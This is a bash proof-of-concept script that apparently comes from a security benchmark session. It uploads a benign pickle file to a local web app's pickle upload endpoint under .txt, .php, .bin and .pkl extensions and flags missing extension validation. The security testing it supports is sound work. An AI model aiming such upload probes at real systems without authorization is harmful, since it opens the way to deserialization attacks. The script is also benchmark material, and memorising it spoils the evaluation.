#!/bin/bash
# POC: Demonstrates that the application accepts pickle files with arbitrary extensions (.txt, .php, .bin) instead of restricting to .pkl/.pickle extensions
# Target: ./repo
# Created: 2025-11-10T15:09:08.669Z
# Session: benchmark-XBEN-036-24-mht9l3st

# File Upload Validation Bypass POC
# Demonstrates that pickle files can be uploaded with arbitrary extensions
# without proper file type validation

set -e

TARGET="${1:-http://localhost:8080}"
TEMP_DIR=$(mktemp -d)
trap "rm -rf $TEMP_DIR" EXIT

echo "[*] File Upload Validation Bypass POC"
echo "[*] Target: $TARGET"
echo ""

# Create a simple pickle payload (benign - just pickles the string "test")
# This creates a valid pickle object without needing to import subprocess
python3 << 'EOF' > "$TEMP_DIR/pickle_payload.pkl"
import pickle
import io
import sys

# Create a simple pickled object
data = "test_payload"
pickle_data = pickle.dumps(data)
sys.stdout.buffer.write(pickle_data)
EOF

echo "[*] Created benign pickle payload"
echo ""

# Test 1: Upload with .txt extension
echo "[TEST 1] Uploading pickle with .txt extension"
cp "$TEMP_DIR/pickle_payload.pkl" "$TEMP_DIR/test_upload.txt"
RESPONSE=$(curl -s -w "\n%{http_code}" -F "pickle_file=@$TEMP_DIR/test_upload.txt" "$TARGET/")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "Response HTTP Code: $HTTP_CODE"
echo "Response Body: $BODY"

if [ "$HTTP_CODE" == "200" ]; then
    echo "[✓] VULNERABLE: .txt extension accepted"
else
    echo "[✗] .txt extension rejected"
fi
echo ""

# Test 2: Upload with .php extension
echo "[TEST 2] Uploading pickle with .php extension"
cp "$TEMP_DIR/pickle_payload.pkl" "$TEMP_DIR/test_upload.php"
RESPONSE=$(curl -s -w "\n%{http_code}" -F "pickle_file=@$TEMP_DIR/test_upload.php" "$TARGET/")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "Response HTTP Code: $HTTP_CODE"
echo "Response Body: $BODY"

if [ "$HTTP_CODE" == "200" ]; then
    echo "[✓] VULNERABLE: .php extension accepted"
else
    echo "[✗] .php extension rejected"
fi
echo ""

# Test 3: Upload with .bin extension
echo "[TEST 3] Uploading pickle with .bin extension"
cp "$TEMP_DIR/pickle_payload.pkl" "$TEMP_DIR/test_upload.bin"
RESPONSE=$(curl -s -w "\n%{http_code}" -F "pickle_file=@$TEMP_DIR/test_upload.bin" "$TARGET/")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "Response HTTP Code: $HTTP_CODE"
echo "Response Body: $BODY"

if [ "$HTTP_CODE" == "200" ]; then
    echo "[✓] VULNERABLE: .bin extension accepted"
else
    echo "[✗] .bin extension rejected"
fi
echo ""

# Test 4: Upload with legitimate .pkl extension (should also work)
echo "[TEST 4] Uploading pickle with .pkl extension (baseline test)"
cp "$TEMP_DIR/pickle_payload.pkl" "$TEMP_DIR/test_upload.pkl"
RESPONSE=$(curl -s -w "\n%{http_code}" -F "pickle_file=@$TEMP_DIR/test_upload.pkl" "$TARGET/")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "Response HTTP Code: $HTTP_CODE"
echo "Response Body: $BODY"

if [ "$HTTP_CODE" == "200" ]; then
    echo "[✓] .pkl extension accepted (as expected)"
else
    echo "[✗] .pkl extension rejected (unexpected)"
fi
echo ""

echo "[*] POC Complete"
echo "[*] Vulnerability Status: File extension validation is NOT enforced"